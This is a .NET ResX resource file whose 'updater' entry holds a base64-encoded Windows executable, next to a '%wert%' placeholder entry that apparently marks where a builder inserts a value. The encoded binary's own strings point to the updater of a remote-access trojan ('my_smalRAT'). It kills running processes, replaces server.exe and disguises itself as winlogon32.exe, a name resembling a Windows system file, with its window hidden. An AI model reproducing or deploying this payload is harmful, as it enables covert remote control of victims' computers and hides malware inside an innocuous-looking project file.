<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <assembly alias="mscorlib" name="mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
  <data name="updater" type="System.Byte[], mscorlib">
    <value>
        TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        gAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0K
        JAAAAAAAAABQRQAATAEEAHIlL00AAAAAAAAAAOAAAgELAQgAABIAAAAOAAAAAAAAfjAAAAAgAAAAQAAA
        AABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACgAAAABAAAAAAAAAIAQIUAABAAABAAAAAAEAAAEAAA
        AAAAABAAAAAAAAAAAAAAADAwAABLAAAAAGAAANAJAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAAAAQAAA
        HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAA
        CCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAhBAAAAAgAAAAEgAAAAQAAAAAAAAAAAAAAAAAACAAAGAuc2Rh
        dGEAAJUAAAAAQAAAAAIAAAAWAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAADQCQAAAGAAAAAKAAAAGAAA
        AAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAACAAAAAAgAAACIAAAAAAAAAAAAAAAAAAEAAAEIAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        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
        DAM6ABIAjQN6AwYAnwOVAwYAqAOYAAYAsgPAAQYA4AOVAwoAJwQABAoAWwQABAYAdgR6AwYAkwR6AwYA
        sASYAAYA3gR6A3sA8gQAAAYAAQUtAgYAIQUtAgAAAAABAAAAAAABAAEAAQAQACkAMgAFAAEAAQARAK0A
        IAABAO8ALQABAA4BMQABABkBMQABACQBMQABADABMQAIIQAAAAARGFQAEwABABghAAAAAAYYWwAXAAEA
        kCEAAAAAEQBhABsAAQCUIgAAAACWALcAEwACAKQiAAAAAEQCvAAoAAIA9CIAAAAAAQD6ABcAAwCIIwAA
        AAABAEQBNAADAAAAAQBwAAAAAQDEAAAAAQBPAQAAAgBWAQwAWwAXAAkAWwAXADEAWwBCAAkAZQFIADkA
        egFOAEEAkQFSAEkAsgFYAFkA2QEbAAwA3wFeAAwA6QFeAAwA9gFiABkA/wFoAAwACwJsAAwAFAJzAAwA
        IAJ5AGEAXAJ+ABkAWwCDAAwAawKIAFkAbwIbADkAdAKfAGkAvAAXAAkAvAAoAIEApgIXAHEAWwCpAIkA
        xQKvAIkA6wK1AHkAWwBzAAkA/QK7AAkAHAPBAIEAMAPHAAkAOQPMAAkARQMoAAkAUgMoAAkAZAPHAIEA
        bQMoALkAuQPcADkAvwMTAKEAyAPhAKEA2wMXAMEA5QPoAMEA7APtAKkAWwDHAKkA8wPHAKEAWwAXAKEA
        +gPyAMkAMwT4AMkAQwQTAAkAVQQXANEAWwAXANkAWwAXAOEAWwAXAOkAWwAXAPEAWwAUAQEBWwB5AAkB
        WwAXACAAkwEPAS4AswEjAS4AqwEaAS4AuwEsAUMAiwEPAWAAkwEPAYAAowEPAaAAkwEPAcAAmwEPAY4A
        pQDRAP4AOwAEgAAAAAAAAAAAAAAAAAAAAAAyAAAAAgAAAAAAAAAAAAAAAQAKAAAAAAAIAAAAAAAAAAAA
        AAAKABMAAAAAAAIAAAAAAAAAAAAAAAEAOgAAAAAAAgAAAAAAAAAAAAAAAQCYAAAAAAACAAAAAAAAAAAA
        AAAKAIQCAAAAAAAAAAABAAAAwwQAAAAAADxNb2R1bGU+AG1zY29ybGliAE1pY3Jvc29mdC5WaXN1YWxC
        YXNpYwB1cGRhdGVyeAB1cGRhdGVyAFN5c3RlbS5XaW5kb3dzLkZvcm1zAEZvcm0ALmNjdG9yAC5jdG9y
        AF9fRU5DQWRkVG9MaXN0AHZhbHVlAFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljAExpc3RgMQBTeXN0
        ZW0AV2Vha1JlZmVyZW5jZQBfX0VOQ0xpc3QATWFpbgBEaXNwb3NlAGRpc3Bvc2luZwBTeXN0ZW0uQ29t
        cG9uZW50TW9kZWwASUNvbnRhaW5lcgBjb21wb25lbnRzAEluaXRpYWxpemVDb21wb25lbnQAU2VydmVy
        X2V4ZQB1cGRhdGVfZXhlAG1TZXJ2ZXJfZXhlAFByb3plc3NJRABFdmVudEFyZ3MARm9ybTFfTG9hZABz
        ZW5kZXIAZQBFdmVudEhhbmRsZXIAYWRkX0xvYWQAQXBwbGljYXRpb24AZ2V0X1N0YXJ0dXBQYXRoAFN0
        cmluZwBDb25jYXQARW52aXJvbm1lbnQAU3BlY2lhbEZvbGRlcgBHZXRGb2xkZXJQYXRoAFN5c3RlbS5U
        aHJlYWRpbmcATW9uaXRvcgBFbnRlcgBnZXRfQ291bnQAZ2V0X0NhcGFjaXR5AGdldF9JdGVtAGdldF9J
        c0FsaXZlAHNldF9JdGVtAFJlbW92ZVJhbmdlAHNldF9DYXBhY2l0eQBTeXN0ZW0uUnVudGltZS5Db21w
        aWxlclNlcnZpY2VzAFJ1bnRpbWVIZWxwZXJzAEdldE9iamVjdFZhbHVlAEFkZABFeGl0AFJ1bgBJRGlz
        cG9zYWJsZQBTeXN0ZW0uRHJhd2luZwBTaXplRgBTaXplAENvbnRyb2wAU3VzcGVuZExheW91dABDb250
        YWluZXJDb250cm9sAHNldF9BdXRvU2NhbGVEaW1lbnNpb25zAEF1dG9TY2FsZU1vZGUAc2V0X0F1dG9T
        Y2FsZU1vZGUAc2V0X0NsaWVudFNpemUARm9ybUJvcmRlclN0eWxlAHNldF9Gb3JtQm9yZGVyU3R5bGUA
        c2V0X05hbWUAc2V0X09wYWNpdHkAc2V0X1Nob3dJY29uAHNldF9TaG93SW5UYXNrYmFyAHNldF9UZXh0
        AFJlc3VtZUxheW91dABTeXN0ZW0uRGlhZ25vc3RpY3MAUHJvY2VzcwBTeXN0ZW0uSU8ARmlsZUluZm8A
        RXhjZXB0aW9uAFRocmVhZABTbGVlcABEb0V2ZW50cwBHZXRQcm9jZXNzZXNCeU5hbWUAS2lsbABGaWxl
        AEV4aXN0cwBEZWxldGUATW92ZVRvAFN0YXJ0AE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5Db21waWxlclNl
        cnZpY2VzAFByb2plY3REYXRhAFNldFByb2plY3RFcnJvcgBDbGVhclByb2plY3RFcnJvcgBDbG9zZQBE
        ZXNpZ25lckdlbmVyYXRlZEF0dHJpYnV0ZQBEZWJ1Z2dlck5vblVzZXJDb2RlQXR0cmlidXRlAERlYnVn
        Z2VyU3RlcFRocm91Z2hBdHRyaWJ1dGUAU1RBVGhyZWFkQXR0cmlidXRlAHVwZGF0ZXIudXBkYXRlcngu
        cmVzb3VyY2VzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAQ29tcGlsYXRpb25SZWxh
        eGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB1cGRhdGVyLmV4ZQAA
        ABdcAHMAZQByAHYAZQByAC4AZQB4AGUAABdcAHUAcABkAGEAdABlAC4AZQB4AGUAAB9cAHcAaQBuAGwA
        bwBnAG8AbgAzADIALgBlAHgAZQAAEXUAcABkAGEAdABlAHIAeAAAD3UAcABkAGEAdABlAHIAABV3AGkA
        bgBsAG8AZwBvAG4AMwAyAAAAAAARLpJO6AHdQ6ShtaXiyAavAAi3elxWGTTgiQiwP19/EdUKOgMAAAED
        IAABBAABARwHBhUSCQESDQQgAQECAwYSEQIGDgYgAgEcEhUGFRIJARINBSACARwYBSABARIZAwAADgUA
        Ag4ODgUAAQ4RKQMgAAgFIAETAAgDIAACBiACAQgTAAUgAgEICAQgAQEIBAABHBwEIAEBHAUgAQETABAH
        CAgIEg0VEgkBEg0IAgIIBQABARIFAwcBAgUgAgEMDAUgAQEROQUgAQERSQUgAQERPQUgAQERTQQgAQEO
        BCABAQ0KBwQRORE5ET0RPQQAAQEIBgABHRJRDgQAAQIOBAABAQ4FAAESUQ4FAAEBElkQBwgIElESVRJR
        ElkIHRJRAgQBAAAABSABARF9CAEABwEAAAAACAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9u
        VGhyb3dzAQBYMAAAAAAAAAAAAABuMAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYDAAAAAAAAAAAF9D
        b3JFeGVNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByJS9N
        AAAAAAIAAAB5AAAAHEAAABwWAABSU0RTNTg9mn5wfUmwX2rFwLv8KQEAAABZOlwjUHJvamVrdGVcI1By
        b2dyYW1tZVxWQi5ORVQtUHJvamVrdGVcbXlfc21hbFJBVFxteV9zbWFsUkFUXHVwZGF0ZXJ4XG9ialx4
        ODZcRGVidWdcdXBkYXRlci5wZGIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAMAAAAwAACADgAAAFAAAIAQAAAA
        aAAAgBgAAACAAACAAAAAAAAAAAAAAAAAAAACAAIAAACYAACAAwAAALAAAIAAAAAAAAAAAAAAAAAAAAEA
        AH8AAMgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAAOAAAIAAAAAAAAAAAAAAAAAAAAEAAQAAAPgAAIAAAAAA
        AAAAAAAAAAAAAAEAAAAAABABAAAAAAAAAAAAAAAAAAAAAAEAAAAAACABAAAAAAAAAAAAAAAAAAAAAAEA
        AAAAADABAAAAAAAAAAAAAAAAAAAAAAEAAAAAAEABAAAAAAAAAAAAAAAAAAAAAAEAAAAAAFABAACoYwAA
        6AIAAAAAAAAAAAAAkGYAACgBAAAAAAAAAAAAALhnAAAiAAAAAAAAAAAAAABgYQAARAIAAAAAAAAAAAAA
        4GcAAOoBAAAAAAAAAAAAAEQCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+
        AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAABAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIA
        RgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASkAQAA
        AQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACAAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIA
        AQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIA
        cwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAADgADAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAA
        dQBwAGQAYQB0AGUAcgAuAGUAeABlAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAA
        IAAAAEAADAABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAAB1AHAAZABhAHQAZQByAC4A
        ZQB4AGUAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAA
        OAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAAAAAAA
        KAAAACAAAABAAAAAAQAEAAAAAACAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAA
        gACAAICAAACAgIAAwMDAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHd3d3d3d3d3d3d3
        d3d3cARERERERERERERERERERHAE//////////////////RwBP/////////////////0cAT/////////
        ////////9HAE//////////////////RwBP/////////////////0cAT/////////////////9HAE////
        //////////////RwBP/////////////////0cAT/////////////////9HAE//////////////////Rw
        BP/////////////////0cAT/////////////////9HAE//////////////////RwBP//////////////
        ///0cAT/////////////////9HAE//////////////////RwBP/////////////////0cAT/////////
        ////////9HAEiIiIiIiIiIiIiIiIiIRwBEREREREREREREREREREcARMTExMTExMTExOzs5JdHAEzMzM
        zMzMzMzMzMzMzMQAAERERERERERERERERERAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAP/////////////////////AAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAAB
        gAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAAB
        gAAAAYAAAAPAAAAH////////////////KAAAABAAAAAgAAAAAQAEAAAAAADAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAACAgIAAwMDAAAAA/wAA/wAAAP//AP8AAAD/AP8A
        //8AAP///wAAAAAAAAAAAAd3d3d3d3d3REREREREREdP///////4R0////////hHT///////+EdP////
        ///4R0////////hHT///////+EdP///////4R0////////hHSIiIiIiIiEdMzMzMzMzMR8RERERERETA
        AAAAAAAAAAAAAAAAAAAAAP//AACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAQAA//8AAP//AAAAAAEAAgAgIBAAAQAEAOgCAAACABAQEAABAAQAKAEAAAMAAAAAAAAA
        77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0K
        PGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RW
        ZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJN
        eUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3Nv
        ZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXMg
        eG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlcXVlc3Rl
        ZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAg
        PC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9h
        c3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAwAAAMAAAAgDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</value>
  </data>
  <data name="text" xml:space="preserve">
    <value>%wert%</value>
  </data>
</root>